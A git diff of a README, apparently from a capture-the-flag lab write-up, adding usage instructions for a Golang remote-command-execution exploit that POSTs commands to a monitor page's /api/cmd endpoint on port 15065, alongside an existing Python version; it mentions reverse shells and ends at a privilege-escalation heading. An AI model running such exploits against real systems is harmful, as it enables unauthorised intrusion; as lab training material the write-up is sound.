@@ -64,7 +64,7 @@ ssh bread@$TARGET -i <your_key_name>
 ```
 
 
-### Monitor_RCE
+### Monitor_RCE (Python)
 
 To successfully execute commands using [monitor_rce](monitor_rce.py), you must pass in the command as a string and give the program the target IP address and port number. An example of how to run the program is below.
 
@@ -106,3 +106,24 @@ drwxrwxr-x 3 bread bread    4096 Apr  6  2020 resources
 ============================================================
 [+] command successfully executed
 ```
+
+### Monitor RCE (Golang)
+
+The Golang RCE exploit for the monitor page is very similar to the Python3 exploit. It conducts the same attack, POSTing to `/api/cmd` and printing the command output to `STDOUT`.  There are two ways the attacker can execute the Golang program: 1) using go's `run` command or 2) compiling it into a binary and running the binary.
+
+Go Run:
+
+```bash
+go run monitor_rce.go -d $TARGET -p 15065 -c "<command>"
+```
+
+Compilation And Execution:
+
+```bash
+go build monitor_rce.go
+./monitor_rce -d $TARGET -p 15065 -c "<command>"
+```
+
+*Note: If the command's execution time exceeds the Client's timeout, no output will be returned; instead, a the message `timeout occurred. assuming reverse shell or long running command` will appear. To adjust the timeout of the Client, modify the initialization parameter "Timeout: 10 \* time.Second" when the Client gets initialized in `main` .*
+
+## PrivEsc (Bread --> Ramen)
